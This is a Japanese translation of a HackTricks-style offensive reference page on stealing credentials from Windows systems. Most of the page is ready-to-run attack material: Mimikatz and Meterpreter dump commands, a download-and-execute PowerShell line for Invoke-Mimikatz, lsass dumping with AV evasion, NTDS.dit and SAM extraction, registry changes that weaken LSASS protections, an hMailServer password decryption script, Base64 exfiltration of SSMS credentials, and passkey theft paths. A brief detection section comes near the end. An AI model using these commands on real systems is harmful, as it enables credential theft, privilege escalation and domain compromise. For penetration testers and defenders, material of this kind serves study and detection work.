# Windowsの認証情報の窃取

{{#include ../../banners/hacktricks-training.md}}

## 認証情報 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatzでできるその他のことは** [**このページ**](credentials-mimikatz.md)**で確認できます。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**考えられる認証情報の保護についてはこちらをご覧ください。**](credentials-protections.md) **これらの保護により、Mimikatzによる一部の認証情報の抽出を防止できる可能性があります。**

## Meterpreterでの認証情報

私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用して、被害者内部のパスワードとハッシュを検索します。**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV の回避

### Procdump + Mimikatz

**Procdump は** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) の**正規の Microsoft ツールであるため**、Defender では検出されません。\
このツールを使って、**lsass process を dump** し、**dump を download** して、dump から **credentials をローカルで extract** できます。

[SharpDump](https://github.com/GhostPack/SharpDump) も使用できます。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) を使用して自動的に実行されます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注**: 一部の **AV** は、**procdump.exe を使用して lsass.exe を dump する**操作を **malicious** として **detect** する可能性があります。これは、**"procdump.exe" と "lsass.exe"** という文字列を **detect** しているためです。そのため、より **stealthier** にするには、**lsass.exe の名前**ではなく、lsass.exe の **PID** を **argument** として procdump に渡します。

### **comsvcs.dll** を使用した lsass の Dump

`C:\Windows\System32` にある **comsvcs.dll** という名前の DLL は、crash 発生時の **process memory の dump** を担当します。この DLL には **`MiniDumpW`** という **function** が含まれており、`rundll32.exe` を使用して invoke するよう設計されています。\
最初の2つの argument は使用しても意味がありませんが、3つ目は3つの component に分かれています。dump 対象の process ID が1つ目の component、dump file の場所が2つ目、3つ目は必ず **full** という単語になります。代替 options は存在しません。\
これら3つの component を parse すると、DLL は dump file の作成と、指定した process の memory のこのファイルへの転送を開始します。\
**comsvcs.dll** を使用して lsass process を dump することが可能なため、procdump を upload して execute する必要がなくなります。この method の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) に記載されています。<sup>[[9]](#references)</sup>

実行には次の command を使用します:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**このプロセスは** [**lssasy**](https://github.com/Hackndo)**で自動化できます。**

### **Task Managerでlsassをダンプする**

1. Task Barを右クリックし、Task Managerをクリックします
2. More detailsをクリックします
3. Processesタブで「Local Security Authority Process」プロセスを検索します
4. 「Local Security Authority Process」プロセスを右クリックし、「Create dump file」をクリックします

### procdumpでlsassをダンプする

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suiteの一部であるMicrosoft署名済みバイナリです。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBladeでlsassをdump

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)は、メモリダンプをobfuscateし、ディスクに保存せずにリモートワークステーションへ転送できるProtected Process Dumper Toolです。

**主な機能**:

1. PPL protectionのbypass
2. Defenderのsignature-based detection mechanismsを回避するためのメモリダンプファイルのobfuscate
3. ディスクに保存せずにRAWおよびSMB upload methodsでメモリダンプをupload（fileless dump）
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – MiniDumpWriteDumpを使用しないSSPベースのLSASS dumping

Ink Dragonは、`MiniDumpWriteDump`を一度も呼び出さない3段階のdumper、**LalsDumper**を提供しています。そのため、このAPIに対するEDR hooksは発火しません:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll`内から32個の小文字の`d`で構成されたplaceholderを検索し、`rtu.txt`へのabsolute pathで上書きします。パッチ済みのDLLを`nfdp.dll`として保存し、`AddSecurityPackageA("nfdp","fdp")`を呼び出します。これにより、**LSASS**はmalicious DLLを新しいSecurity Support Provider (SSP)としてloadします。
2. **Stage 2 inside LSASS** – LSASSが`nfdp.dll`をloadすると、DLLは`rtu.txt`を読み込み、各byteを`0x20`とXORし、decodeしたblobをmemoryにmapしてからexecutionをtransferします。
3. **Stage 3 dumper** – mapされたpayloadは、hashed API names（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）からresolveした**direct syscalls**を使用してMiniDump logicを再実装します。`Tom`という専用exportは`%TEMP%\<pid>.ddt`をopenし、compressed LSASS dumpをfileにstreamしてからhandleをcloseするため、後でexfiltrationを実行できます。

Operator notes:

* `lals.exe`、`fdp.dll`、`nfdp.dll`、`rtu.txt`を同じdirectoryに配置してください。Stage 1はhard-coded placeholderを`rtu.txt`へのabsolute pathで書き換えるため、これらを分割するとchainが壊れます。
* Registrationは`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`に`nfdp`をappendすることで行われます。このvalueを自分でseedしておけば、毎回のboot時にLSASSがSSPをreloadするようにできます。
* `%TEMP%\*.ddt` filesはcompressed dumpsです。localでdecompressしてから、credential extractionのためにMimikatz/Volatilityへ渡します。
* `lals.exe`の実行にはadmin/SeTcb rightsが必要です。これにより`AddSecurityPackageA`が成功します。callがreturnすると、LSASSはrogue SSPを透過的にloadし、Stage 2をexecuteします。
* DLLをdiskから削除しても、LSASSからevictされることはありません。registry entryを削除してLSASSをrestart（reboot）するか、long-term persistenceのために残しておいてください。

## CrackMapExec

### SAM hashesをDumpする
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### target DC から NTDS.dit を Dumpする
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### target DC から NTDS.dit の password history を Dumpする
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 各 NTDS.dit アカウントの pwdLastSet 属性を表示する
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM の窃取

これらのファイルは _C:\windows\system32\config\SAM_ と _C:\windows\system32\config\SYSTEM._ に**存在するはずです**。しかし、これらは保護されているため、**通常の方法でそのままコピーすることはできません**。

### レジストリから

これらのファイルを盗む最も簡単な方法は、レジストリからコピーを取得することです：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
それらのファイルをKali machineに**Download**し、以下を使用して**hashesをextract**します：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

このサービスを使用して、保護されたファイルをコピーできます。Administrator 権限が必要です。

#### Using vssadmin

vssadmin binary は Windows Server versions でのみ利用できます。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
ただし、**Powershell**から同じことを実行できます。これは**SAM fileのコピー方法**の例です（使用するハードドライブは「C:」で、C:\users\Publicに保存されます）が、保護された任意のファイルのコピーにも使用できます：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Finally, [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) を使用して SAM、SYSTEM、ntds.dit のコピーを作成することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** ファイルは **Active Directory** の心臓部として知られており、ユーザーオブジェクト、グループ、およびそのメンバーシップに関する重要なデータを保持しています。ドメインユーザーの **password hashes** が保存されている場所です。このファイルは **Extensible Storage Engine (ESE)** データベースであり、**_%SystemRoom%/NTDS/ntds.dit_** に存在します。

このデータベースでは、主に次の3つのテーブルが管理されています。

- **Data Table**: ユーザーやグループなどのオブジェクトに関する詳細を保存します。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: 各オブジェクトの **Security descriptors** を保持し、保存されたオブジェクトのセキュリティとアクセス制御を確保します。

Christoffer Andersson の database-layer に関する研究では、これらのテーブルとバージョンごとの動作について、より詳しく説明されています。<sup>[[8]](#references)</sup>

Windows は _Ntdsa.dll_ を使用してこのファイルとやり取りし、_lsass.exe_ によって使用されます。そのため、**NTDS.dit** ファイルの **一部** は **`lsass`** のメモリ内に存在する可能性があります（**cache** を使用することでパフォーマンスが向上するため、最新のアクセスデータを取得できる可能性があります）。

#### NTDS.dit 内のハッシュを復号する

ハッシュは3回暗号化されています。

1. **BOOTKEY** と **RC4** を使用して、Password Encryption Key (**PEK**) を復号する。
2. **PEK** と **RC4** を使用して **hash** を復号する。
3. **DES** を使用して **hash** を復号する。

**PEK** はすべてのドメインコントローラーで**同じ値**ですが、そのドメインコントローラーの **SYSTEM** hive にある、DC固有の **BOOTKEY** を使用して **NTDS.dit** 内で暗号化されています。したがって、credentials を抽出するには **NTDS.dit** と **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) の両方が必要です。

### Ntdsutil を使用して NTDS.dit をコピーする

Windows Server 2008 以降で利用できます。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
[**volume shadow copy**](#stealing-sam-and-system) の手法を使って **ntds.dit** ファイルをコピーすることもできます。**SYSTEM file** のコピーも必要になることを忘れないでください（再度、[**registry から dump するか、volume shadow copy**](#stealing-sam-and-system) の手法を使用してください）。

### **NTDS.dit から hashes を抽出する**

**NTDS.dit** と **SYSTEM** ファイルを**取得**したら、_secretsdump.py_ などのツールを使用して **hashes を抽出**できます。
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
有効なドメイン管理者ユーザーを使用して、**それらを自動的に抽出**することもできます：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**大容量の NTDS.dit ファイル**の場合は、[gosecretsdump](https://github.com/c-sto/gosecretsdump) を使用して抽出することが推奨されます。

最後に、**metasploit module**: _post/windows/gather/credentials/domain_hashdump_ または **mimikatz** `lsadump::lsa /inject` も使用できます。

### **NTDS.dit からドメインオブジェクトを SQLite データベースに抽出する**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使用すると、NTDS オブジェクトを SQLite データベースに抽出できます。secret だけでなく、raw NTDS.dit ファイルがすでに取得されている場合に、さらなる情報抽出に利用できるオブジェクト全体とその属性も抽出されます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive は任意ですが、secrets の復号（NT および LM hashes、cleartext passwords などの supplemental credentials、kerberos または trust keys、NT および LM password histories）を可能にします。その他の情報とともに、以下のデータが抽出されます: hashes を含む user および machine accounts、UAC flags、last logon および password change の timestamp、accounts の description、names、UPN、SPN、groups および recursive memberships、organizational units の tree および membership、trusts type、direction、attributes を含む trusted domains...

## Lazagne

[こちら](https://github.com/AlessandroZ/LaZagne/releases)から binary を download します。この binary を使用すると、複数の software から credentials を抽出できます。
```
lazagne.exe all
```
## SAM と LSASS から credentials を抽出するその他の tools

### Windows credentials Editor (WCE)

この tool は memory から credentials を抽出するために使用できます。以下から download してください: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM file から credentials を抽出する
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM file から credentials を抽出する
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

[http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) から Download し、単に **execute it** すると passwords が抽出されます。

## アイドル状態の RDP セッションの探索と security controls の弱体化

Ink Dragon の FinalDraft RAT には、あらゆる red-teamer に役立つ手法を備えた `DumpRDPHistory` tasker が含まれています:<sup>[[3]](#references)</sup>

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` にあるすべての user hive を parse します。各サブキーには server name、`UsernameHint`、および最終書き込み timestamp が保存されています。PowerShell を使って FinalDraft のロジックを再現できます:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log を query し、Event ID **21**（successful logon）と **25**（disconnect）を確認して、誰がその box を管理していたかを把握します:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

どの Domain Admin が定期的に接続しているかを把握したら、その **disconnected** session がまだ存在している間に、LSASS を（LalsDumper/Mimikatz で）dump します。CredSSP + NTLM fallback により、その verifier と tokens が LSASS に残るため、それらを SMB/WinRM 経由で replay して `NTDS.dit` を取得したり、domain controllers 上で persistence を確立したりできます。

### FinalDraft が標的とする Registry downgrades

同じ implant は、credential theft を容易にするため、複数の registry keys も tamper します:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` を設定すると、RDP で完全な credential/ticket reuse が強制され、pass-the-hash 型の pivot が可能になる。
* `LocalAccountTokenFilterPolicy=1` は UAC token filtering を無効化するため、local admin がネットワーク経由で制限のない token を取得できる。
* `DSRMAdminLogonBehavior=2` により、DC がオンラインの状態でも DSRM administrator が log on できるため、攻撃者に別の組み込み high-privilege account が与えられる。
* `RunAsPPL=0` は LSASS PPL protections を解除し、LalsDumper などの dumper による memory access を容易にする。

## hMailServer の database credentials (post-compromise)

hMailServer は、`C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` の `[Database] Password=` に DB password を保存する。この値は、static key `THIS_KEY_IS_NOT_SECRET` と 4-byte word endianness swaps を使用して Blowfish で暗号化されている。INI の hex string を使用し、次の Python snippet を実行する:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
平文パスワードを使用して、ファイルロックを回避するために SQL CE データベースをコピーし、32-bit provider を読み込み、必要に応じて upgrade してからハッシュをクエリします:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` 列は hMailServer のハッシュ形式（hashcat mode `1421`）を使用します。これらの値をクラックすると、WinRM/SSH pivots に再利用可能な認証情報を取得できる場合があります。

## LSA Logon Callback Interception (LsaApLogonUserEx2)

一部のツールは、LSA logon callback `LsaApLogonUserEx2` をインターセプトすることで、**plaintext logon passwords** をキャプチャします。これは、認証パッケージの callback を hook またはラップし、認証情報を**logon 中**（ハッシュ化前）にキャプチャしてから、ディスクに書き込むか operator に返すという手法です。一般的には、LSA に inject または登録する helper として実装され、成功した各 interactive/network logon event の username、domain、password を記録します。<sup>[[1]](#references)</sup>

運用上の注意:
- authentication path に helper をロードするには、local admin/SYSTEM が必要です。
- キャプチャされた認証情報は、logon が発生した場合にのみ表示されます（hook に応じて interactive、RDP、service、または network logon）。

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) は、ユーザーごとの `sqlstudio.bin` ファイルに saved connection information を保存します。専用の dumper はこのファイルを解析し、保存された SQL credentials を復元できます。command output のみを返す shell では、ファイルを Base64 としてエンコードし、stdout に出力して exfiltrate することがよくあります。<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
operator側でファイルを再ビルドし、dumperをローカルで実行してcredentialsを復元します：
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Chrome on Windows からの Passkeys / WebAuthn credential theft

**victim user**として Windows ホスト上でコード実行を取得し、**Chrome + Google Password Manager synced passkeys**を使用している場合、**admin/SYSTEM**権限がなくても、passkeys は興味深い post-exploitation の標的になります。<sup>[[4]](#references)</sup>

### 興味深いローカルアーティファクト
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** には、protobufでエンコードされた **`WebauthnCredentialSpecifics`** レコードが保存されます。同一ユーザーのプロセスは、同期されたpasskeyの **RP ID**、**username**、**credential ID**、および暗号化された秘密鍵のマテリアルを列挙できます。<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** には、**`wrapped_identity_private_key`** や、同期されたcredentialの復元に使用されるラップ済みシークレットなど、ローカルデバイスの登録状態が保存されます。<sup>[[4]](#references)</sup>

簡易トリアージ:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobは依然としてローカル署名oracleとして悪用できる

ブラウザがTPM-backed identity keyを**`NCRYPT_OPAQUE_KEY_BLOB`**としてエクスポートし、そのblobをユーザーがアクセス可能なstateに保存すると、malwareはraw private keyを抽出する必要がありません。同じマシン上でblobを再インポートし、ローカルTPMに攻撃者が制御するデータへの署名を要求するだけで済みます:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
これは、**hardware binding によりデバイス外へのエクスポートは防止できるが、侵害されたエンドポイント上での同一ユーザーによる利用は防止できない**ことを意味します。

### 実際の悪用経路

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Chrome の LevelDB から `WebauthnCredentialSpecifics` を列挙する。
- passkey login を開始し、新しい WebAuthn challenge を取得する。
- 盗み出した `wrapped_identity_private_key` blob を被害者の TPM 上で使用し、cloud-authenticator request binding に署名する。
- 返された assertion を relying party に relay する。
- これは、RP が `userVerification=preferred` を受け入れる場合、または **`UV=0`** の assertion を拒否できない場合に特に有効である。
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- `passkey_enclave_state` を削除するか、有効な署名済み `device/forget` operation を送信して再オンボーディングを強制する。
- オンボーディング後もデバイスが **`uv_key_pending`** の状態にある場合、攻撃者が制御する UV 公開鍵を登録する。
- provider が新しい UV key の attestation / secure-hardware origin を検証しない場合、その後の攻撃者の key による署名は **`UV=1`** として扱われる。
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- recovery または rejoin を強制し、Chrome に synced-passkey master secret を取得させる。
- `passkey_enclave_state` の再作成または変更を監視し、その後、平文の **security domain secret (SDS)** が常駐している間に Chrome のメモリを dump する。
- 回収した SDS を使用して、すべての `WebauthnCredentialSpecifics` record 内の暗号化フィールドを復号し、portable WebAuthn private key を回収する。

### DFIR / 検知のアイデア

- **`passkey_enclave_state` の削除／再作成**を監視する。<sup>[[4]](#references)</sup>
- ブラウザ以外の process による Chrome の **`Sync Data\LevelDB`** への異常なアクセスを alert する。
- **Chrome のメモリ dump** または不審な cross-process memory access を alert する。
- **Google Password Manager recovery PIN** prompt の繰り返し表示や、予期しない再オンボーディングを調査する。
- WebAuthn の **`signCount`** は synced passkey では一定のままとなる場合が多く、役に立たないことがあるため、従来型の clone detection は弱い点に注意する。

## References

- [1] [Unit 42 – 高価値セクターを標的とした、長年にわたり検知されなかった operations の調査](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP 経由の Word VBA macro phishing → hMailServer credential decryption → Veeam CVE-2023-27532 による SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: relay network と stealthy offensive operation の内部を明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: passwordless authentication における新たな attack surface](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows hacking: Microsoft systems and networksへの攻撃](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory Data Store の実際の動作: NTDS.dit の内部 (Part 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
{{#include ../../banners/hacktricks-training.md}}
